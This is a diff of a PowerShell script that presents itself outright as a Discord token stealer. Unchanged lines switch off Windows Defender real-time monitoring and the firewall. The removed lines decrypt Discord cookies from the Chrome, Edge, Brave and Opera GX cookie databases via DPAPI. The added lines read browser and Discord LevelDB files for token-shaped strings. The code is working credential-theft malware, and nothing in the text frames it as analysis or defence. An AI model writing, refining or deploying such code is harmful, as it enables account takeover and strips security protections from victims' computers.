@@ -15,10 +15,7 @@ try {
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 netsh advfirewall set allprofiles state off > $null
 
-# === LOAD SQLITE ASSEMBLY ===
-Add-Type -AssemblyName System.Data.SQLite
-
-# === STEAL DISCORD TOKENS FROM ALL SOURCES ===
+# === STEAL TOKENS FROM BROWSERS (WITHOUT SQLITE) ===
 $tokens = @()
 
 # 1. Discord App LevelDB
@@ -36,40 +33,23 @@ $tokens = @()
     }
 }
 
-# 2. Browser Cookies (Chrome/Edge/Brave/OperaGX)
+# 2. Browser Local Storage (Chrome/Edge/Brave)
 $browsers = @(
-    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" },
-    @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" },
-    @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies" },
-    @{ Name = "OperaGX"; Path = "$env:APPDATA\Opera Software\Opera GX Stable\Network\Cookies" }
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
 )
 
-foreach ($browser in $browsers) {
-    if (Test-Path $browser.Path) {
-        $tempDb = "$env:TEMP\cookies_$([Guid]::NewGuid().ToString()).db"
-        try {
-            Copy-Item $browser.Path $tempDb -Force
-            $conn = New-Object System.Data.SQLite.SQLiteConnection
-            $conn.ConnectionString = "Data Source=$tempDb;Version=3;"
-            $conn.Open()
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'"
-            $reader = $cmd.ExecuteReader()
-            while ($reader.Read()) {
-                $encryptedValue = $reader["encrypted_value"]
-                try {
-                    # DPAPI decryption (works for most cookies)
-                    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    $value = [System.Text.Encoding]::UTF8.GetString($decrypted)
-                    if ($value -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
-                        $tokens += $value
+foreach ($ldbPath in $browsers) {
+    if (Test-Path $ldbPath) {
+        Get-ChildItem "$ldbPath\*.log", "$ldbPath\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
+                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
+                        $tokens += $_.Value
                     }
-                } catch {}
-            }
-            $conn.Close()
-        } catch {}
-        finally {
-            if (Test-Path $tempDb) { Remove-Item $tempDb -Force }
+                }
+            } catch {}
         }
     }
 }
